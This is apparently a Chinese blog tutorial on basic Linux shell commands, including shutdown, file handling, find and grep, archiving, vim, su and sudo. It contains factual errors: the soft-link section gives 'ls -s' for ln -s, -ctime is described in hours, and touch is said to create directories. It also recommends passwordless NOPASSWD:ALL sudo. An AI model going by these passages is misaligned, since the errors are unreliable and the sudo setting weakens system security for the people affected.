<h1 id="服务器关机指令"><a href="#服务器关机指令" class="headerlink" title="服务器关机指令"></a>服务器关机指令</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">关机指令为：shutdown ；</span><br><span class="line"></span><br><span class="line"><span class="built_in">sync</span>                   <span class="comment"># 将数据由内存同步到硬盘中。</span></span><br><span class="line"></span><br><span class="line">shutdown               <span class="comment"># 关机指令，你可以man shutdown 来看一下帮助文档。例如你可以运行如下命令关机：</span></span><br><span class="line"></span><br><span class="line">shutdown –h 10         <span class="comment"># 这个命令告诉大家，计算机将在10分钟后关机</span></span><br><span class="line"></span><br><span class="line">shutdown –h now        <span class="comment"># 立马关机</span></span><br><span class="line"></span><br><span class="line">shutdown –h 20:25      <span class="comment"># 系统会在今天20:25关机</span></span><br><span class="line"></span><br><span class="line">shutdown –h +10        <span class="comment"># 十分钟后关机</span></span><br><span class="line"></span><br><span class="line">shutdown –r now        <span class="comment"># 系统立马重启</span></span><br><span class="line"></span><br><span class="line">shutdown –r +10        <span class="comment"># 系统十分钟后重启</span></span><br><span class="line"></span><br><span class="line">reboot                 <span class="comment"># 就是重启，等同于 shutdown –r now</span></span><br><span class="line"></span><br><span class="line">halt                   <span class="comment"># 关闭系统，等同于shutdown –h now 和 poweroff</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 最后总结一下，不管是重启系统还是关闭系统，首先要运行 sync 命令，把内存中的数据写到磁盘中。</span></span><br></pre></td></tr></table></figure>

<h1 id="文件目录操作命令"><a href="#文件目录操作命令" class="headerlink" title="文件目录操作命令"></a>文件目录操作命令</h1><table>
<thead>
<tr>
<th>命令</th>
<th>对应英文</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>ls</code></td>
<td>list</td>
<td>查看当前目录下的内容</td>
</tr>
<tr>
<td><code>pwd</code></td>
<td>print work directory</td>
<td>查看当前所在目录</td>
</tr>
<tr>
<td><code>cd [目录名]</code></td>
<td>change directory</td>
<td>切换目录</td>
</tr>
<tr>
<td><code>touch [文件名]</code></td>
<td>touch</td>
<td>若文件不存在则新建文件</td>
</tr>
<tr>
<td><code>mkdir [目录名]</code></td>
<td>make directory</td>
<td>创建目录</td>
</tr>
<tr>
<td><code>rm [文件名]</code></td>
<td>remove</td>
<td>删除指定文件</td>
</tr>
<tr>
<td><code>clear</code></td>
<td>clear</td>
<td>清屏</td>
</tr>
</tbody></table>
<h2 id="查看-切换目录——pwd-cd"><a href="#查看-切换目录——pwd-cd" class="headerlink" title="查看\切换目录——pwd &amp; cd"></a>查看\切换目录——pwd &amp; cd</h2><blockquote>
<p><strong>pwd</strong>：<br>① 作用：查看当前所在目录</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">pwd</span>        <span class="comment"># 查看当前工作目录</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>cd</strong>：<br>① 作用：切换当前工作目录，即进入指定目录<br>② 语法：<code>cd [目录名]</code></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span>         <span class="comment"># 当前用户目录</span></span><br><span class="line"><span class="built_in">cd</span> ~       <span class="comment"># 当前用户目录</span></span><br><span class="line"><span class="built_in">cd</span> /       <span class="comment"># 根目录</span></span><br><span class="line"><span class="built_in">cd</span> -       <span class="comment"># 上一次访问的目录</span></span><br><span class="line"><span class="built_in">cd</span> ..      <span class="comment"># 上一级目录</span></span><br><span class="line"><span class="built_in">cd</span> ../..   <span class="comment">#返回上两级目录 </span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="列出目录内容——ls"><a href="#列出目录内容——ls" class="headerlink" title="列出目录内容——ls"></a>列出目录内容——ls</h2><blockquote>
<p><strong>ls</strong>：<br>① 作用：显示指定目录下的内容<br>② 语法：<code>ls [-a -l -h] [目录名]</code> </p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>-a</code>：显示所有文件及目录（<code>.</code>开头的隐藏文件也会列出）</li>
<li><code>-l</code>：除文件名称外，同时将文件形态（ <code>d</code> 表示目录，<code>-</code> 表示文件）、权限、拥有者、文件大小等信息详细列出</li>
<li><code>-h</code>：以人性化的方式显示文件大小（与 <code>-l</code> 搭配使用）</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span>       <span class="comment"># 列出当前目录文件的文件名（不含隐藏文件）</span></span><br><span class="line"><span class="built_in">ls</span> -a    <span class="comment"># 列出当前目录文件的文件名（含隐藏文件）</span></span><br><span class="line"><span class="built_in">ls</span> -l    <span class="comment"># 列出文件详情</span></span><br><span class="line"><span class="built_in">ls</span> -la   <span class="comment"># 列出文件详情（含隐藏文件）</span></span><br><span class="line"><span class="built_in">ls</span> -lh   <span class="comment"># 以人性化的方式显示文件大小</span></span><br><span class="line"><span class="built_in">ls</span> /etc  <span class="comment"># 列出指定目录 /etc 目录文件的文件名</span></span><br></pre></td></tr></table></figure>



<hr>
<h2 id="创建文件目录——mkdir-touch"><a href="#创建文件目录——mkdir-touch" class="headerlink" title="创建文件目录——mkdir &amp; touch"></a>创建文件目录——mkdir &amp; touch</h2><blockquote>
<p><strong>mkdir</strong>：<br>① 作用：创建目录<br>② 语法：<code>mkdir [-p] 目录名</code></p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>-p</code>：选项可选，表示自动创建不存在的父目录，适用于创建连续多层级的目录</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> aaa               <span class="comment"># 在当前目录下创建aaa目录，相对路径</span></span><br><span class="line"><span class="built_in">mkdir</span> ./bbb             <span class="comment"># 在当前目录下创建bbb目录，相对路径</span></span><br><span class="line"><span class="built_in">mkdir</span> /ccc              <span class="comment"># 在根目录下创建ccc目录，绝对路径</span></span><br><span class="line"><span class="built_in">mkdir</span> -p ddd/eee        <span class="comment"># 递归创建目录（会创建里面没有的目录文件夹）</span></span><br></pre></td></tr></table></figure>


<blockquote>
<p><strong>touch</strong>：<br>① 作用：修改文件或者目录的时间属性，包括存取时间和更改时间。若文件不存在，系统会建立一个新的文件<br>② 语法：<code>touch [-a -m]  文件名</code></p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>-a</code>：更改文件的访问时间为当前时间</li>
<li><code>-m</code>：更改文件的修改时间为当前时间</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> aaa               <span class="comment"># 若aaa目录不存在则新建目录</span></span><br><span class="line"><span class="built_in">touch</span> a.txt             <span class="comment"># 创建a.txt文件</span></span><br><span class="line"><span class="built_in">touch</span> -a a.txt          <span class="comment"># 更改文件的访问时间为当前时间</span></span><br><span class="line"><span class="built_in">touch</span> -m a.txt          <span class="comment"># 更改文件的修改时间为当前时间</span></span><br></pre></td></tr></table></figure>


<hr>
<h2 id="查找——which-find"><a href="#查找——which-find" class="headerlink" title="查找——which &amp; find"></a>查找——which &amp; find</h2><blockquote>
<p><strong>which</strong>：</p>
<p>① 作用：查看所使用的一系列的程序文件存放在哪里<br>② 语法：<code>which 要查找的命令</code></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">which</span> <span class="built_in">cd</span>                    <span class="comment"># 查看 cd 命令程序文件存放在哪里</span></span><br><span class="line"><span class="built_in">which</span> <span class="built_in">pwd</span>                   <span class="comment"># 查看 pwdd 命令程序文件存放在哪里</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>find</strong>：</p>
<p>① 作用：搜索指定文件<br>② 语法：<code>find 起始路径 -option 参数</code></p>
<hr>
<p><strong>说明：<code>[-option]</code></strong></p>
<ul>
<li><code>-name</code>：后面指定搜索的文件名称</li>
<li><code>-type</code>：指定搜索的文件类型：<code>	d</code>目录文件，<code>b</code>块设备，<code>c</code>字符设备，<code>l</code>符号链接</li>
<li><code>-size</code>：指定文件大小：n（单位k）</li>
<li><code>-empty</code>：只搜索空的文件或空目录</li>
<li><code>-ctime</code>：指定搜索创建时间在n小时前创建的文件</li>
</ul>
<hr>
<p>find 命令支持通配符 <code>*</code>，用来做模糊匹配</p>
<hr>
<p>find 命令 - 按文件大小查找</p>
<ul>
<li>语法：<code>find 起始路径 -size [+-]n[kMG]</code></li>
<li>+、-表示大于、小于</li>
<li>n 表示大小数字</li>
<li>kMG为大小单位，k（小写）表示 kb，M表示MB，G表示GB</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -name <span class="string">&quot;*.java&quot;</span>       <span class="comment"># 在当前目录及其子目录下查找.java结尾文件</span></span><br><span class="line">find /aaa -name <span class="string">&quot;*.java&quot;</span>    <span class="comment"># 在/aaa目录及其子目录下查找.java结尾文件</span></span><br><span class="line">find . -<span class="built_in">type</span> d -empty       <span class="comment"># 搜索当前目录下的空目录</span></span><br><span class="line">find . -ctime 1             <span class="comment"># 搜索当前目录下，1小时前创建的文件</span></span><br><span class="line"></span><br><span class="line">find . -size -10k           <span class="comment"># 查找当前目录下小于 10kb 的文件</span></span><br><span class="line">find / -size +100M          <span class="comment"># 查找大于 100MB 的文件</span></span><br><span class="line">find / -size +1G            <span class="comment"># 查找大于 1GB 的文件</span></span><br></pre></td></tr></table></figure>

<h2 id="grep-wc-管道符"><a href="#grep-wc-管道符" class="headerlink" title="grep &amp; wc &amp; 管道符"></a>grep &amp; wc &amp; 管道符</h2><blockquote>
<p><strong>grep</strong>：<br>① 作用：从文件中通过关键字过滤文件行<br>② 语法：<code>grep [-n] 关键字 文件路径</code></p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>-n</code>：可选，在结果中显示匹配的行的行号</li>
<li><code>文件路径</code>：必填，要过滤内容的文件路径，<strong>可作为管道符输入</strong></li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep hello test.txt      <span class="comment"># 在当前目录的 test.txt 过滤包含 hello 的行</span></span><br><span class="line">grep -n hello test.txt   <span class="comment"># 在当前目录的 test.txt 过滤包含 hello 的行并显示行号</span></span><br></pre></td></tr></table></figure>


<blockquote>
<p><strong>wc</strong>：<br>① 作用：统计文件的行数、单词数量等<br>② 语法：<code>wc [-c -m -l -w] 文件路径</code></p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>-c</code>：可选，统计 bytes 数量</li>
<li><code>-m</code>：可选，统计 字符 数量</li>
<li><code>-l</code>：可选，统计 行数</li>
<li><code>-w</code>：可选，统计 单词 数量</li>
<li><code>文件路径</code>：必填，被统计的文件，<strong>可作为管道符输入</strong></li>
</ul>
<hr>
<ul>
<li>不添加可选项时，会显示以下内容：<br><code>行数 单词数量 当前文件字节数量 文件名</code></li>
</ul>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815124520.png" alt=" "></p>
<blockquote>
<p><strong>管道符</strong>：<br>① 作用：将管道符左边命令的结果，作为右边命令的内容源<br>② 语法：<code>|</code></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将 cat test.txt 的输出结果（文件内容）作为 grep 的内容源（被过滤文件）</span></span><br><span class="line"><span class="built_in">cat</span> test.txt | grep hello </span><br><span class="line"></span><br><span class="line"><span class="comment">#  将 cat test.txt 的输出结果（文件内容）作为 wc 的内容源入（被统计文件）</span></span><br><span class="line"><span class="built_in">cat</span> test.txt | <span class="built_in">wc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从 test.txt 中找到既包含 hello 又包含 tyt 的行</span></span><br><span class="line"><span class="built_in">cat</span> test.txt | grep hello | grep tyt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看 cd 程序文件详情</span></span><br><span class="line"><span class="built_in">ls</span> -l /usr/bin | grep <span class="built_in">cd</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计 /usr/bin 目录下文件数量</span></span><br><span class="line"><span class="built_in">ls</span> -l /usr/bin | <span class="built_in">wc</span> -l</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="echo-重定向符"><a href="#echo-重定向符" class="headerlink" title="echo &amp; 重定向符"></a>echo &amp; 重定向符</h2><blockquote>
<p><strong>echo</strong>：<br>① 作用：在命令行内输出指定内容<br>② 语法：<code>echo 输出的内容</code></p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li>带有空格或<code>\</code>等特殊符号，可使用双引号包围</li>
<li>反引号 &#96; ：被 反引号包围的内容，会被作为命令执行</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 命令行输出 hello world</span></span><br><span class="line"><span class="built_in">echo</span> hello world</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行 ls 命令</span></span><br><span class="line"><span class="built_in">echo</span> `<span class="built_in">ls</span>`</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>重定向符</strong>：<code>&gt;</code>与<code>&gt;&gt;</code></p>
<ul>
<li><code>&gt;</code>：将左侧命令结果，<strong>覆盖</strong>追加到符号右侧指定的文件中</li>
<li><code>&gt;&gt;</code>：将左侧命令结果，<strong>追加</strong>到符号右侧指定的文件中</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 向 test.txt 写入 hello</span></span><br><span class="line"><span class="built_in">echo</span> hello &gt; test.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向 test.txt 追加 world</span></span><br><span class="line"><span class="built_in">echo</span> world &gt;&gt; test.txt</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="显示文件内容——cat-more-tail"><a href="#显示文件内容——cat-more-tail" class="headerlink" title="显示文件内容——cat &amp; more &amp; tail"></a>显示文件内容——cat &amp; more &amp; tail</h2><blockquote>
<p><strong>cat</strong>：<br>① 作用：用于显示全部文件内容<br>② 语法：<code>cat [-n] 文件名</code></p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>-n</code>：选项可选，对输出内容进行行数编号</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/profile          <span class="comment"># 查看 /etc 目录下的 profile 文件内容</span></span><br><span class="line"><span class="built_in">cat</span> -n /etc/profile       <span class="comment"># 由 1 开始对输出内容进行行数编号</span></span><br><span class="line"><span class="built_in">cat</span> -A /etc/profile       <span class="comment"># 查看 /etc 目录下的 profile 文件内容（含不可见字符）</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>more</strong>：<br>① 作用：以分页的形式显示文件内容<br>② 语法：<code>more 文件名</code><br>③ 操作说明</p>
<ul>
<li><code>回车键</code>：向下滚动一行</li>
<li><code>空格键</code>：向下滚动一屏</li>
<li><code>b</code>：返回上一屏</li>
<li><code>q</code> 或者 <code>Ctrl + c</code>：退出 more</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">more /etc/profile         <span class="comment"># 以分页形式显示 /etc 目录下的 profile 文件内容</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>tail</strong>：<br>① 作用：查看文件末尾的内容，跟踪文件的最新更改<br>② 语法：<code>tail [-f -num] 文件名</code> </p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>-f</code>：选项可选，表示持续跟踪</li>
<li><code>-num</code>：查看尾部多少行，默认 10 行</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> /etc/profile         <span class="comment"># 显示 /etc 目录下的 profile 文件末尾10行的内容</span></span><br><span class="line"><span class="built_in">tail</span> -20 /etc/profile     <span class="comment"># 显示 /etc 目录下的 profile 文件末尾20行的内容</span></span><br><span class="line"><span class="built_in">tail</span> -f /etc/profile      <span class="comment"># 动态读取 /etc 目录下的 profile 文件末尾内容并显示</span></span><br></pre></td></tr></table></figure>




<hr>
<h2 id="删除文件目录——rmdir-rm"><a href="#删除文件目录——rmdir-rm" class="headerlink" title="删除文件目录——rmdir &amp; rm"></a>删除文件目录——rmdir &amp; rm</h2><blockquote>
<p><strong>rmdir</strong>：<br>① 作用：删除空目录<br>② 语法：<code>rmdir [-p] dirName</code></p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>-p</code>：选项可选，递归删除目录</li>
</ul>
</blockquote>
<blockquote>
<p><strong>rm</strong>：<br>① 作用：删除文件或目录<br>② 语法：<code>rm [-rf] name</code></p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>-r</code>：选项可选，删除文件夹</li>
<li><code>-f</code>：选项可选，强制删除（不会弹出提示确认信息）</li>
</ul>
<hr>
<p>rm 命令支持通配符 <code>*</code>，用来做模糊匹配</p>
<ul>
<li>符号 <code>*</code> 表示通配符，即匹配内容（包含空），示例：</li>
<li><code>test*</code>，表示匹配任何以test开头的内容</li>
<li><code>*test</code>，表示匹配任何以test结尾的内容</li>
<li><code>*test*</code>，表示匹配任何包含test的内容</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rmdir</span> aaa         <span class="comment"># 删除名为aaa的空目录</span></span><br><span class="line"><span class="built_in">rmdir</span> -p aaa/bbb  <span class="comment"># 删除aaa目录下的bbb空子目录，若bbb删除后aaa变为空目录，则aaa也被删除</span></span><br><span class="line"><span class="built_in">rmdir</span> aaa*        <span class="comment"># 删除名称以aaa*开始的空目录</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -r aaa/        <span class="comment"># 删除aaa目录以及目录下的所有文件，删除前需确认</span></span><br><span class="line"><span class="built_in">rm</span> -rf aaa/       <span class="comment"># 强制删除aaa目录以及目录下的所有文件，无需确认</span></span><br><span class="line"><span class="built_in">rm</span> -rf a.txt      <span class="comment"># 强制删除a.txt文件，无需确认</span></span><br><span class="line"><span class="built_in">rm</span> -rf ./a*       <span class="comment"># 强制删除当前目录下以a开头的所有文件</span></span><br><span class="line"><span class="built_in">rm</span> -rf ./*	       <span class="comment"># 强制删除当前目录下所有文件（慎用）</span></span><br></pre></td></tr></table></figure>


<hr>
<h2 id="拷贝移动——cp-mv"><a href="#拷贝移动——cp-mv" class="headerlink" title="拷贝移动——cp &amp; mv"></a>拷贝移动——cp &amp; mv</h2><blockquote>
<p><strong>cp</strong>：<br>① 作用：用于赋复制文件或目录<br>② 语法：<code>cp [-r] source dest</code></p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>-r</code>：选项可选，用于复制文件夹</li>
</ul>
</blockquote>
<blockquote>
<p><strong>mv</strong>：<br>① 作用：为文件或目录改名、或将文件或目录移动到其他位置<br>② 语法：<code>mv source dest</code></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> a.txt aaa                  <span class="comment"># 将当前目录下的a.txt复制到aaa目录</span></span><br><span class="line"><span class="built_in">cp</span> a.txt ./b.txt              <span class="comment"># 将a.txt复制到当前目录，并改名为b.txt</span></span><br><span class="line"><span class="built_in">cp</span> -r aaa/ ./bbb/             <span class="comment"># 将aaa目录以及目录下的所有文件全部复制到bbb目录下</span></span><br><span class="line"><span class="built_in">cp</span> -r aaa/* ./bbb/            <span class="comment"># 将aaa目录下的所有文件全部复制到bbb目录下</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mv</span> a.txt b.txt                <span class="comment"># 将a.txt改名为b.txt</span></span><br><span class="line"><span class="built_in">mv</span> a.txt bbb/                 <span class="comment"># 将a.txt移动到bbb目录中</span></span><br><span class="line"><span class="built_in">mv</span> a.txt bbb/b.txt            <span class="comment"># 将a.txt移动到bbb目录中并改名为b.txt</span></span><br><span class="line"><span class="built_in">mv</span> aaa/ bbb/                  <span class="comment"># 如果bbb目录不存在，则将aaa目录改名为bbb;若存在，则将aaa目录移动到bbb目录</span></span><br><span class="line"><span class="built_in">mv</span> aaa/* bbb/                 <span class="comment"># 将aaa目录中所有文件移动至bbb目录</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="软连接——ls"><a href="#软连接——ls" class="headerlink" title="软连接——ls"></a>软连接——ls</h2><blockquote>
<p><strong>ls</strong>：<br>① 作用：将文件、文件夹链接到其他位置，类似 windoms 系统中的《快捷方式》<br>② 语法：<code>ls -s 被链接的文件或文件夹 链接目的地</code></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将 /etc 下的 yum.conf 软连接到 /tyt 目录下</span></span><br><span class="line"><span class="built_in">ls</span> -s /etc/yum.conf /tyt/yum.conf </span><br><span class="line"><span class="comment"># 将 /etc 下的 yum 软连接到 /tyt 目录下</span></span><br><span class="line"><span class="built_in">ls</span> -s /etc/yum /tyt/yum</span><br></pre></td></tr></table></figure>


<hr>
<h1 id="压缩与解压"><a href="#压缩与解压" class="headerlink" title="压缩与解压"></a>压缩与解压</h1><h2 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h2><blockquote>
<p><strong>tar</strong>：<br>① 作用：对文件进行打包、解包、压缩、解压<br>② 语法：<code>tar [-c -v -x -f -z -C] fileName [files]</code></p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>-c</code>：压缩模式，创建压缩文件</li>
<li><code>-v</code>：显示压缩、解压的执行过程，用于查看进度</li>
<li><code>-x</code>：解压模式</li>
<li><code>-f</code>：指定要创建或需要解压的文件，<code>-f</code>选项必须在所有选项中处于最后一个位置</li>
<li><code>-z</code>：gzip模式，不使用<code>-z</code>则代表tarball格式</li>
<li><code>-C</code>：选择解压的目的地，用于解压模式</li>
</ul>
<hr>
<p><strong>注</strong>：</p>
<ul>
<li>包文件后缀为<code>.tar</code>表示只是完成了打包并没有压缩</li>
<li>包文件后缀为<code>.tar.gz</code>表示打包的同时还进行了压缩</li>
<li><code>-z</code>选项如果使用的话，一般处于选项第一个</li>
<li><code>-f</code>选项，<strong>必须</strong>在选项位最后一个</li>
<li><code>-C</code>选项单独使用，和解压所需的其他参数分开</li>
</ul>
</blockquote>
<p>以下演示为 tar 的常用组合</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打包</span></span><br><span class="line"><span class="comment"># 将 1.txt, 2.txt 压缩到 test.tar 文件内</span></span><br><span class="line">tar -cvf test.tar 1.txt 2.txt</span><br><span class="line"><span class="comment"># 将aaa目录以及目录下所有文件打包，打包名为aaa.tar</span></span><br><span class="line">tar -cvf aaa.tar aaa               </span><br><span class="line"> <span class="comment"># 将当前目录下所有文件打包并压缩，打包后文件名为aaa.tar.gz，使用 gzip 模式</span></span><br><span class="line">tar -zcvf aaa.tar.gz ./*           </span><br><span class="line"></span><br><span class="line"><span class="comment">#解包</span></span><br><span class="line"><span class="comment"># 将aaa.tar文件进行解包，并将解包后的文件放在当前目录</span></span><br><span class="line">tar -xvf aaa.tar                    </span><br><span class="line"><span class="comment"># 将aaa.tar.gz文件进行解压，并将解压后的文件放在当前目录，使用 gzip 模式</span></span><br><span class="line">tar -zxvf aaa.tar.gz                </span><br><span class="line"><span class="comment"># 将aaa.tar.gz文件进行解压，并将解压后的文件放在/usr/local目录  </span></span><br><span class="line">tar -zxvf aaa.tar.gz -C /usr/local  </span><br></pre></td></tr></table></figure>

<hr>
<h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><blockquote>
<p><strong>zip</strong>：<br>① 作用：压缩文件为 zip 压缩包<br>② 语法：<code>zip [-r] fileName [files]</code></p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>-r</code>：被压缩的包含文件夹的是够吗，需要使用<code>-r</code>选项，与<code>rm</code>、<code>cp</code>等命令的<code>-r</code>效果一致</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将 1.txt，2.txt 压缩到 test.zip</span></span><br><span class="line">zip test.zip 1.txt 2.txt</span><br><span class="line"><span class="comment"># 将 f1, f2 两个文件夹与 1.txt 文件，压缩到 test.zip</span></span><br><span class="line">zip -r test.zip f1 f2 1.txt</span><br></pre></td></tr></table></figure>


<hr>
<h2 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h2><blockquote>
<p><strong>unzip</strong>：<br>① 作用：解压 zip 压缩包<br>② 语法：<code>unzip [-d] fileName</code></p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>-d</code>：指定要解压的位置，同<code>tar</code>的<code>-C</code>选项</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将 test.zip 解压到当前目录</span></span><br><span class="line">unzip test.zip</span><br><span class="line"><span class="comment"># 将 test.zip 解压到 /usr/local 目录</span></span><br><span class="line">unzip test.zip -d /usr/local</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="文本编辑命令"><a href="#文本编辑命令" class="headerlink" title="文本编辑命令"></a>文本编辑命令</h1><h2 id="文本编辑——vi-vim"><a href="#文本编辑——vi-vim" class="headerlink" title="文本编辑——vi &amp; vim"></a>文本编辑——vi &amp; vim</h2><p><strong>vi：</strong><br> ① 作用：vi命令是Linux系统提供的一个文本编辑工具，可以对文件内容进行编辑，类似于Windows的记事本<br> ② 语法：<code>vi 文件名</code><br> ③ 说明：</p>
<ul>
<li>vim是从vi发展来的一个功能更加强大的文本编辑工具，在编辑文件时可以对文本内容进行着色，方便我们对文件进行编辑处理，所以在实际开发中vim更加常用</li>
<li>要使用vim命令，需要我们自己安装。可使用命令完成 <code>yum install vim</code> 安装</li>
</ul>
<hr>
<p><strong>vim：</strong><br> ① 作用：对文件内容进行编辑，vim其实就是一个文件编辑器<br> ② 语法：<code>vim 文件名</code><br> ③ 说明：</p>
<ul>
<li>在使用vim命令编辑文件时，如果指定的文件存在则直接打开文件；若不存在则新建文件。</li>
<li>vim在进行文本编辑时共分为三种模式，分别是&#x3D;&#x3D;命令模式（Command mode）、插入模式（Insert mode）、底行模式（Last line mode）&#x3D;&#x3D;。三种模式之间可以互相切换</li>
</ul>
<p> <strong>1. 命令模式</strong></p>
<ul>
<li>命令模式下可以查看文件内容、移动光标（上下左右箭头、<code>gg</code>【快速移动至文件头】、<code>G</code>【快速移动至文件末尾】）</li>
<li>通过vim命令打开文件后，默认进入命令模式</li>
<li>另外两种模式需要首先进入命令模式，才能进入彼此</li>
</ul>
<hr>
<p> <strong>2. 插入模式</strong></p>
<ul>
<li>插入模式下可以对文件内容进行编辑</li>
<li>在命令模式下按下【<code>i</code>，<code>a</code>，<code>o</code>】任意一个，可以进入插入模式。进入后，在下方会有 <code>insert</code> 字样</li>
<li>在插入模式下按下<code>ESC</code>键，回到命令模式</li>
</ul>
<hr>
<p><strong>3. 底行模式</strong></p>
<ul>
<li>底行模式下可以通过命令对文件内容进行查找、显示行号、退出等操作</li>
<li>在命令模式下按下【<code>:</code>，<code>/</code>】任意一个，可以进入底行模式</li>
<li>通过 <code>/</code> 方式进入底行模式后，可以对文件内容进行查找</li>
<li>通过 <code>:</code> 方式进入底行模式，可以输入<code>wq</code>（保存并退出）、<code>q!</code>（不保存退出）、<code>set nu</code>（显示行号）、<code>q</code>（仅退出）、<code>w</code>（仅保存）、、<code>set paste</code>（设置粘贴模式）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim +10 a.txt                   <span class="comment"># 打开a.txt文件并跳到第10行</span></span><br><span class="line">vim -R /etc/passwd              <span class="comment"># 以只读模式打开文件</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="权限操作"><a href="#权限操作" class="headerlink" title="权限操作"></a>权限操作</h1><h2 id="su"><a href="#su" class="headerlink" title="su"></a>su</h2><blockquote>
<p><strong>su</strong>：<br>① 作用：切换系统账户<br>② 语法：<code>su [-] [用户名]</code></p>
<hr>
<p><strong>说明：</strong></p>
<ul>
<li><code>-</code>：符号可选，表示是否在切换用户后加载环境变量</li>
<li><code>用户名</code>：参数可选，表示要切换的用户，缺省表示切换到 root</li>
</ul>
<hr>
<ul>
<li>切换用户后，可通过 exit 命令退回到上一个用户</li>
<li>使用普通用户，切换到其他用户<strong>需要输入密码</strong></li>
<li>使用 root 用户切换到其他用户，<strong>无需密码</strong>，可以直接切换</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#切换到 root 用户</span></span><br><span class="line">su - root  </span><br><span class="line">su -</span><br><span class="line"><span class="comment"># 切换到 tangyt 用户</span></span><br><span class="line">su - tangyt</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h2><blockquote>
<p><strong>sudo</strong>：<br>① 作用：为普通的命令授权，临时以 root 身份执行<br>② 语法：<code>sudo 其他命令</code></p>
<hr>
<ul>
<li>在其他命令 之前，带上 <code>sudo</code>，即可为这一条命令临时赋予 root 授权</li>
<li>并不是所有用户都有权利使用 <code>sudo</code>，我们需要为普通用户配置 <code>sudo</code> 认证</li>
</ul>
</blockquote>
<p><strong>为普通用户配置 sudo 认证</strong></p>
<ul>
<li>切换到 root 用户，执行 <code>visudo</code> 命令，会自动通过 vi 编辑器打开：&#x2F;etc&#x2F;sudoers</li>
<li>在文件末尾添加<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">用户名 ALL=(ALL)     NOPASSWD:ALL</span><br><span class="line"><span class="comment"># 其中 NOPASSWD:ALL 表示使用 sudo 命令无需输入密码</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="用户组管理"><a href="#用户组管理" class="headerlink" title="用户组管理"></a>用户组管理</h2><p><strong>以下命令需要 root  用户执行</strong></p>
<ul>
<li>创建用户组</li>
